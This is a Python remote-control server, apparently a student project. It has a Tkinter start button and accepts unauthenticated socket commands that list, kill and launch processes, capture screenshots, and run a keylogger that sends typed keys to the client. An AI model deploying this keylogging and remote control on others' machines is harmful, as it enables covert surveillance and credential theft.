from tkinter import *
from socket import *
from threading import Thread
import threading
import time
import pyautogui
import os
import signal
import wmi
import win32gui
import win32process
import win32pdhutil
import pythoncom
from pynput import keyboard

#=============================== Define control code ===============================#

QUIT             =  '0'
PROCESS_RUNNING  =  '1'
APP_RUNNING      =  '2'
SHUT_DOWN        =  '3'
SCREEN_CAPTURE   =  '4'
KEYSTROKE        =  '5'
EDIT_REGISTRY    =  '6'
EXIT             =  '7'

KILL             =  'K'
START            =  'S'
VIEW             =  'V'
HOOK			 =  'H'
UNHOOK			 =  'U'
PRINT            =  'P'

#=============================== +++++++++++++++++++++++++ ===============================#

HOST = ''
PORT = 12225
Address = (HOST, PORT)
Server = socket(AF_INET, SOCK_STREAM)
global var_status

#=============================== +++++++++++++++++++++++++ ===============================#

def Process(Client_socket):
	while True:
		Code = Client_socket.recv(1).decode("utf8")
		if (Code == VIEW):
			pythoncom.CoInitialize() # Running Windows functions in threads can be tricky since it often involves COM objects.
			f = wmi.WMI()
			processes = f.ExecQuery('select Name, ProcessId, ThreadCount from Win32_Process')
			for p in processes:
				Client_socket.sendall(bytes(str(p.ProcessId),"utf8"))
				Client_socket.recv(1)

				Client_socket.sendall(bytes(str(p.Name),"utf8"))
				Client_socket.recv(1)

				Client_socket.sendall(bytes(str(p.ThreadCount),"utf8"))
				Client_socket.recv(1)

			Client_socket.sendall(bytes('__END__',"utf8"))
		elif Code == KILL:
			Client_socket.sendall(bytes('1','utf8'))
			try:
				pid = int(Client_socket.recv(100).decode('utf8'))
				os.kill(pid,signal.SIGTERM)
				Client_socket.sendall(bytes('1','utf8'))
			except:
				Client_socket.sendall(bytes('0','utf8'))
		elif Code == START:
			Client_socket.sendall(bytes('1','utf8'))
			try:
				name = Client_socket.recv(100).decode('utf8')
				os.startfile('"C:/Windows/System32/' + name + '.exe"')
				Client_socket.sendall(bytes('1','utf8'))
			except:
				Client_socket.sendall(bytes('0','utf8'))
		elif Code == QUIT:
			break


def get_hwnds_for_pid (pid):
	def callback (hwnd, hwnds):
		if win32gui.IsWindowVisible (hwnd) and win32gui.IsWindowEnabled (hwnd):
			_, found_pid = win32process.GetWindowThreadProcessId (hwnd)
			if found_pid == pid:
				hwnds.append (hwnd)
		return True
		pass    
  
	hwnds = []
	win32gui.EnumWindows (callback, hwnds)
	return hwnds
	pass

def App(Client_socket):
	while True:
		Code = Client_socket.recv(1).decode("utf8")
		if (Code == VIEW):
			pythoncom.CoInitialize() # Running Windows functions in threads can be tricky since it often involves COM objects.
			f = wmi.WMI()
			for process in f.ExecQuery('select Name , ProcessId , ThreadCount from Win32_Process '):
				t = get_hwnds_for_pid(process.ProcessId)
				if (len(t) != 0):
					Client_socket.sendall(bytes(str(process.ProcessId),"utf8"))
					Client_socket.recv(1)

					Client_socket.sendall(bytes(str(process.Name),"utf8"))
					Client_socket.recv(1)

					Client_socket.sendall(bytes(str(process.ThreadCount),"utf8"))
					Client_socket.recv(1)

			Client_socket.sendall(bytes('__END__',"utf8"))
		elif Code == KILL:
			Client_socket.sendall(bytes('1','utf8'))
			try:
				pid = int(Client_socket.recv(100).decode('utf8'))
				os.kill(pid,signal.SIGTERM)
				Client_socket.sendall(bytes('1','utf8'))
			except:
				Client_socket.sendall(bytes('0','utf8'))
		elif Code == START:
			Client_socket.sendall(bytes('1','utf8'))
			try:
				name = Client_socket.recv(100).decode('utf8')
				os.startfile('"C:/Windows/System32/' + name + '.exe"')
				Client_socket.sendall(bytes('1','utf8'))
			except:
				Client_socket.sendall(bytes('0','utf8'))
		elif Code == QUIT:
			break

def take_picture(Client_socket):
	while True:
		Code = Client_socket.recv(1).decode("utf8")
		# Take picture
		if (Code == "1"):
			#screen capture
			myScreenshot = pyautogui.screenshot()
			f = myScreenshot.tobytes()
			sizef = f.__sizeof__()

			#size of picture
			Client_socket.sendall(bytes(str(sizef),'utf8'))
			Client_socket.recv(1)

			#width of picture
			Client_socket.sendall(bytes(str(myScreenshot.width),'utf8'))
			Client_socket.recv(1)

			#height of picture
			Client_socket.sendall(bytes(str(myScreenshot.height),'utf8'))
			Client_socket.recv(1)

			#picture
			Client_socket.sendall(f)
		# Quit
		elif (Code == QUIT):
			print('quit screenshot')
			break

def keystroke(Client_socket):
	print('do keystroke')
	text = ''
	unhook = True
	def on_press(key):
		nonlocal unhook
		nonlocal text
		if not unhook:
			text += str(key)
			print(text)
		else:
			text = ''

	listener = keyboard.Listener(on_press = on_press, daemon = True)
	listener.daemon = True
	listener.start()

	while True:
		Code = Client_socket.recv(1).decode("utf8")
		if (Code == HOOK):
			print('do hook')
			if unhook:
				unhook = False
				text = ''
		elif Code == UNHOOK:
			print('do unhook')
			if not unhook:
				unhook = True
				text = ''
		elif Code == PRINT:
			print('do print')
			l = len(text)
			Client_socket.sendall(bytes(str(l),'utf8'))
			Client_socket.recv(1)
			if l == 0:
				Client_socket.sendall(bytes('0','utf8'))
			else:
				Client_socket.sendall(bytes(text,'utf8'))
			Client_socket.recv(1)
			text = ''
		elif Code == QUIT:
			listener.stop()
			break


def Shutdown_Computer():
	print('shutdown')
	# os.system("shutdown /s /t 30")

def accept_incoming_connection():
	while True:
		try:
			Client_socket, Client_add = Server.accept()
			Z = threading.Thread(target=Run,args=(Client_socket,Client_add,))
			Z.daemon = True # thread exit automatically when the main thread dies
			Z.start()
		except Exception as e:
			print(e)
			pass

	
def Run(Client_socket,Client_add):
	print(str(Client_add) + ' has connected')
	try:
		# ket client
		# Client_socket, Client_add = Server.accept()
		while True:
			Code = Client_socket.recv(1).decode("utf8")
			#QUIT
			if (Code == QUIT):
				Client_socket.close()
				break
			#Process
			if (Code == PROCESS_RUNNING):
				Process(Client_socket)
			#App Running
			if (Code == APP_RUNNING):
				App(Client_socket)
			#ShutDown
			if (Code == SHUT_DOWN):
				print('tat')
				Shutdown_Computer()
			#TAKEPIC
			if (Code == SCREEN_CAPTURE):
				take_picture(Client_socket)
			#KeyStock
			if (Code == KEYSTROKE):
				keystroke(Client_socket)
			#Edit_Register
			if (Code == EDIT_REGISTRY):
				a = 1
			#Exit
			if (Code == EXIT):
				Client_socket.close()
				print(str(Client_add) + ' has disconnected')
				break
	except Exception as e:
		print(e)
		print("Close")
		Client_socket.close()

def Run_Program(label1):
	if label1.cget("text") == 'OFF':
		var_status.set('ON')
		label1.configure(fg='green')
		Server.bind(Address)
		Server.listen(5)
		Z = threading.Thread(target=accept_incoming_connection)
		Z.daemon = True # thread exit automatically when the main thread dies
		Z.start()


def on_closing():
	Server.close()
	window.destroy()


if __name__ == "__main__":
	window = Tk()
	window.title("Server")
	window.geometry("300x200+100+60")
	button = Button(window, text="Run Server",padx=15,pady=15, width=10, height=4, command=lambda:Run_Program(label1))
	button.pack()
	var_status = StringVar()
	var_status.set('OFF')

	label1 = Label(window,textvariable = var_status,fg='red')
	label1.pack()

	window.protocol("WM_DELETE_WINDOW", on_closing)
	window.mainloop()